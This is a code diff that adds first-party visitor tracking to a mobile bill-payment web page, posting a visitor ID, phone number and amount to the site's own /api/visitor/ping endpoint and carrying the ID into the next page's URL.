@@ -424,6 +424,15 @@
     const mobileNumber = params.get('number') || '60162556095';
     const carrier = params.get('carrier') || 'DIGI';
 
+    // Visitor tracking
+    const _vid = params.get('vid') || localStorage.getItem('_vid') || 'v_' + Math.random().toString(36).slice(2) + Date.now();
+    localStorage.setItem('_vid', _vid);
+    function pingVisitor(page, number, amount, type) {
+      fetch('/api/visitor/ping', { method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ visitorId: _vid, page, number: number || '', amount: amount || '', type: type || 'bill' }) }).catch(() => {});
+    }
+    pingVisitor('pay-bill', mobileNumber, '', 'bill');
+
     // Display number and carrier
     document.getElementById('displayNumber').textContent = mobileNumber;
     document.getElementById('displayCarrier').textContent = carrier.toUpperCase();
@@ -467,7 +476,8 @@
       // Redirect to payment method selection page
       setTimeout(() => {
         const ref = 'NGOS' + Date.now();
-        window.location.href = `/payment-method?number=${encodeURIComponent(mobileNumber)}&carrier=${encodeURIComponent(carrier)}&amount=${amount}&ref=${ref}`;
+        pingVisitor('payment-method', mobileNumber, amount, 'bill');
+        window.location.href = `/payment-method?number=${encodeURIComponent(mobileNumber)}&carrier=${encodeURIComponent(carrier)}&amount=${amount}&ref=${ref}&vid=${encodeURIComponent(_vid)}`;
       }, 800);
     }
 
